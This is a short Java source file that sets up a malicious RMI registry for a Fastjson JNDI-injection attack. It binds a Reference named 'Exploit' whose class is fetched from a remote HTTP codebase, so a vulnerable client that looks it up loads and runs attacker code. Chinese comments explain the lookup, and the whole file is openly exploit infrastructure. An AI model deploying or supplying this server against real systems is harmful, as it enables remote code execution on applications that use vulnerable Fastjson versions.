package com.fastjson.rmi;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.Reference;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class RMIServer {

    public static void main(String argv[]) {
        try {
            
            Registry registry = LocateRegistry.createRegistry(1099);
            // 通过rmi服务先找org.lain.poc.jndi.EvilObjectFactory,若无,则会去factoryLocation寻找EvilObject类
            Reference reference = new Reference("Exploit", "Exploit", "http://localhost:8080/");
            // 绑定 客户端可通过evil来访问
            registry.bind("Exploit", new ReferenceWrapper(reference));
            System.out.println("Waiting for connection......");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
